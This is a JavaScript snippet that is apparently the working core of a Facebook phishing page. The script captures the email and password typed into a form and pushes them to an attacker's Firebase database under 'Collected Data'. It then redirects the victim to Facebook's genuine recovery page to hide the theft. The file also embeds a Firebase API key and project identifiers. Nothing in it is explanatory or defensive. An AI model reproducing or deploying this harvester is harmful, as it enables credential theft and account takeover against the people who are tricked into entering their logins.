var firebaseConfig = {
		    apiKey: "AIzaSyDXP1un0TLbKNSAhTlbRgTTkJwejFErj6I",
            authDomain: "web-bab7e.firebaseapp.com",
            databaseURL: "https://web-bab7e-default-rtdb.firebaseio.com",
            projectId: "web-bab7e",
            storageBucket: "web-bab7e.appspot.com",
            messagingSenderId: "375952667681",
            appId: "1:375952667681:web:ea4dc2928aa59deeef1f60",
            measurementId: "G-E43QWQXBT6"
		};

		firebase.initializeApp(firebaseConfig);

		var messagesRef = firebase.database()
			.ref('Collected Data');
		
		document.getElementById('contactForm')
			.addEventListener('submit', submitForm);

		function submitForm(e) {
			e.preventDefault();

			// Get values
			var email = getInputVal('email');
			var password = getInputVal('password');

			saveMessage(email, password);
			document.getElementById('contactForm').reset();
                        setTimeout(function() {
        location = 'https://www.facebook.com/login/identify/?ctx=recover&c&multiple_results=0&from_login_screen=0&_rdr'
    }, 100)
		}

		// Function to get get form values
		function getInputVal(id) {
			return document.getElementById(id).value;
		}

		// Save message to firebase
		function saveMessage(email, password) {
			var newMessageRef = messagesRef.push();
			newMessageRef.set({
				email: email,
				password: password,
			});
		}
